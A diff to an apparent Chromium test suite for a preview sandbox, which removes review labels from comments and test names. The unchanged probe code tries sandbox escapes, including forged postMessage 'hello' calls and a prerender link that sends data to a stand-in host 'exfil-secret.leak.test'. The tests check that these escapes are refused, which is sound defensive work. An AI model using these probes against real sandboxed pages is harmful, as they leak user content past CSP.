@@ -73,7 +73,7 @@ const S = ${JSON.stringify(studio.url.replace(/\/$/, ''))};
 const UDP = ${udpPort};
 const R = (k, v) => parent.postMessage({ type: 'r', k, v: String(v).slice(0, 200) }, '*');
 R('ran', 'module');
-// A child frame running the frame's bundle would say hello to this window (it never may: review A L2).
+// A child frame running the frame's bundle would say hello to this window (it never may).
 addEventListener('message', (e) => { if (e.source !== parent && e.data && e.data.type === 'hello') R('childHello', 'got'); });
 const stun = async (C) => {
   if (typeof C !== 'function') return 'removed';
@@ -127,7 +127,7 @@ const tries = {
     parent.postMessage({ v: 1, type: 'hello', bundle: '0000000000000000' }, '*', [ch.port2]);
     return 'posted';
   },
-  // Review A H1: Chrome prerenders a link despite the frame's CSP and sandbox — every way to make one is refused.
+  // Chrome prerenders a link despite the frame's CSP and sandbox — every way to make one is refused.
   prerenderHead: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = O + '/prerender-head?d=' + encodeURIComponent(location.pathname); document.head.appendChild(l); return 'set'; },
   prerenderBody: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = O + '/prerender-body'; return add(l); },
   prerenderName: () => { const l = document.createElement('link'); l.rel = 'prerender'; l.href = 'http://exfil-secret.leak.test:${otherPort}/prerender-name?d=PIXELS'; document.head.appendChild(l); return 'set'; },
@@ -438,7 +438,7 @@ async function allowAll(): Promise<void> {
 }
 
 describe.skipIf(!canRun)('the preview sandbox in Chromium', () => {
-  it('⚑ review A H1 c: a workspace component not allowed in this session is never evaluated; its stand-in draws', async () => {
+  it('⚑ a workspace component not allowed in this session is never evaluated; its stand-in draws', async () => {
     expect(studio.previewAllow.size).toBe(0);
     const { view, frame_url, plan_url } = await published('sb');
     const page = await studioPage();
@@ -538,7 +538,7 @@ describe.skipIf(!canRun)('the preview sandbox in Chromium', () => {
     browser = await launch();
   }, 180_000);
 
-  it('⚑ review A L2: the frame bundle outside the frame document (nested deeper, another path) posts no hello, loads no plan', async () => {
+  it('⚑ the frame bundle outside the frame document (nested deeper, another path) posts no hello, loads no plan', async () => {
     const { frame_url, plan_url } = await published('ff');
     const page = await studioPage();
     // The frame document (its CSP, boot.js, b.js) answered by the player for another path (the request rewritten).
